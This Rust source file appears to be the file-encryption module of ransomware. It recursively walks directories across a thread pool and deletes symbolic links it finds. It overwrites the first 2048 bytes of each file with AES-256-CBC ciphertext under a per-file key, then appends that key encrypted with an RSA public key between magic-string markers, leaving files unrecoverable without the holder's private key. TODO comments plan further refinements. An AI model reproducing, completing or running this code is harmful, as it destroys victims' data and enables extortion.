use libaes::Cipher;
use std::fs::{ OpenOptions};
use std::io::{ Read, Seek, SeekFrom, Write, Result , ErrorKind};
use zeroize::Zeroize;
use super::aes_keys::Keys;
use crate::crypt::asymmetric::rsa_func::{read_rsa_key, rsa_encrypt_buffer};
use threadpool::ThreadPool;
use crate::FILESYS;
use std::fs;
/*
    TODO:
    - 1 - done ...
        . fn read_exact_or_eof() in this version of sym_encrypt_file the read_exact
        . may cause an error while reading file shorter or not dobled from buffer_size
    
    - 2 - done part one ...
        . remove header_size param and depend on just buffer_size
        . make the encryption persistent with 4 steps
            # encrypt all files with content size
            # re encrypt remiming size of file
    - 3 - 
        . ensure we are writing the encrypted symmetric key even if the buffer size of
            encrypted content bigger than size of file

    - 4 - 
        . writing public key used for encrypt symmetric keys


*/

fn read_exact_or_eof<R: Read + ?Sized>(reader: &mut R, buf: &mut [u8]) -> Result<usize> {
    let mut total_read = 0;
    while total_read < buf.len() {
        match reader.read(&mut buf[total_read..]) {
            Ok(0) => break, // End of file
            Ok(n) => total_read += n,
            Err(e) if e.kind() == ErrorKind::Interrupted => continue, // Retry if interrupted
            Err(e) => return Err(e), // Propagate other errors
        }
    }

    Ok(total_read)
}

use rsa::{RsaPublicKey, pkcs1::DecodeRsaPublicKey};

pub fn sym_encrypt_file(file_path: &str, pub_key: &RsaPublicKey, buffer_size: usize,magic_string : &'static str) -> Result<()> {

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(file_path)?;

    let mut content = vec![0; buffer_size];
    file.seek(SeekFrom::Start(0))?;

    match read_exact_or_eof(&mut file, &mut content) {
        Ok(bytes_read) => {
            if bytes_read == 0 {
                eprintln!("No data read from the file");
                return Ok(()); // No data to process
            }
            // Adjust content size to actual bytes read
            content.truncate(bytes_read);
        }
        Err(e) => {
            eprintln!("Error reading file: {}", e);
            return Err(e); // Return error immediately
        }
    }

    let keys = Keys::new(); // (symmetric key NOT RSA)
    let cipher = Cipher::new_256(&keys.key);
    let encrypted_content = cipher.cbc_encrypt(&keys.iv, &content);

    // Overwrite the original file with encrypted content
    file.seek(SeekFrom::Start(0))?;
    file.set_len(0)?; // Truncate the file to clear its contents
    file.write_all(&encrypted_content)?;

    match rsa_encrypt_buffer(&keys.key, &pub_key) {
        Ok(encrypted_symmetric_key ) => {

            file.seek(SeekFrom::End(0))?;
            file.write_all( &[magic_string.as_bytes(),b"-", 
                            &encrypted_symmetric_key ,b"-",
                           // &pub_key.as_bytes(),b"-",
                            magic_string.as_bytes()]
                            .concat())?;

            content.zeroize();
        }
        Err(e) => {
            eprintln!("Error encrypting symmetric key: {}", e);
            return Err(e);
        }
    };

    Ok(())
}


/* 
    * for smallest file the file will alwayes loaded into memeory
    * 
*/
pub fn sym_encrypt_file_all(file_path : &str, pub_key : &RsaPublicKey ) -> Result<()> {

    let mut file = OpenOptions::new()
                    .read(true)
                    .write(true)
                    .open(file_path)?;

    let mut content = vec![];
    let mut data = file.read_to_end(&mut content)?;

    let keys = Keys::new();
    let cipher = Cipher::new_256(&keys.key);

    let encrypted_data = cipher.cbc_encrypt(&keys.iv, &mut content);
    file.seek(SeekFrom::Start(0))?; // Move the cursor to the start of the file
    file.set_len(0)?; // Truncate the file to clear its contents
    file.write_all(&encrypted_data)?;
    data.zeroize();
    content.zeroize();

    match rsa_encrypt_buffer(&keys.key, &pub_key) {
        Ok(encrypted_symmetric_key) => file.write_all(&encrypted_symmetric_key)?,
        Err(e) => return Err(e)
    };
    Ok(())
}

pub fn encrypt_all_dir( dir_path: &str, pub_key : &'static RsaPublicKey, pool : &ThreadPool , magic_string : &'static str) -> Result<()> {
    let entries = fs::read_dir(dir_path)?
        .map(|res| res.map(|e| e.path()))
        .collect::<Result<Vec<_>>>()?;

    for path in entries {
        let file_name = path.display().to_string();
        let metadata = path.symlink_metadata()?;

        if metadata.is_symlink() {
            if let Err(e) = fs::remove_file(&file_name) {
                println!("error remove_file encrypt_all_dir {:?}" , e)
            }
            continue
        }

        if path.metadata()?.is_dir() {
            if let Err(e) = encrypt_all_dir(&path.display().to_string() , pub_key , &pool ,  &magic_string) {
                println!("error encrypt_all_dir {:?}", e);
                continue;
            }
            continue;
        }
        if metadata.is_file() {
                pool.execute(move || {
                let file = FILESYS::new(&file_name);
                if let Err(e) = sym_encrypt_file(&file.path , &pub_key , 2048 , &magic_string){
                    println!("{:?}" , e);
                }
            });
        }
    }
    Ok(())
}


pub fn async_encrypt_all_dir(dir_path : &str, pub_key : &'static RsaPublicKey ,magic_string : &'static str) {
    let pool = ThreadPool::new(num_cpus::get());
    if let Err(e) = encrypt_all_dir(&dir_path , &pub_key , &pool , magic_string) {
                    println!("{:?}" , e);
    }

    pool.join();
}